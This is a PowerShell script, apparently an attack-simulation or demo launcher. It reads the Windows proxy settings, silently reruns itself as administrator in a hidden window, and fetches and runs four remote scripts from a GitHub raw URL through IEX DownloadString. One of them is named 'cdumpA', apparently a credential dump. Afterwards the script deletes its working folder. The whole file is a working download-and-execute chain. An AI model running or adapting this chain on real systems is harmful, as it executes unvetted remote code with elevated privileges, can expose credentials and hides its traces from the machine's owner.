#Check if manual proxy is set or not
if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("AutoConfigURL") -ne $Null)
{
    $wsobj = new-object -comobject wscript.shell
    $result = $wsobj.popup("Do not support Proxy PAC")
    exit
}
if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyEnable") -eq 1)
{
    $proxy_url = "http://" + (Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyServer")
}
else
{
    $wsobj = new-object -comobject wscript.shell
    $result = $wsobj.popup("Manual proxy setup not configured")
    Remove-Item C:\CRDemo -Recurse -Force
    exit
}


#If proxy lookup doesn't work, remove IfElse and set static ip address 
#$proxy_url= 'http://13.231.199.128:3128'

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
set-Content C:\CRDemo\proxy.txt $proxy_url
$web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server

#7zip
$chk7z = Get-Item -Path 'C:\Program Files\7-Zip\7z.exe'
if ($chk7z -eq $null)
{
    IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/7zip_33667pr.ps1')
}

#scanning
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/scan_33667pr.ps1') 

#hosts
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/hosts_33667pr.ps1')

#cdumpA
IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/cdumpa_33667pr.ps1')

Remove-Item C:\CRDemo -Recurse -Force
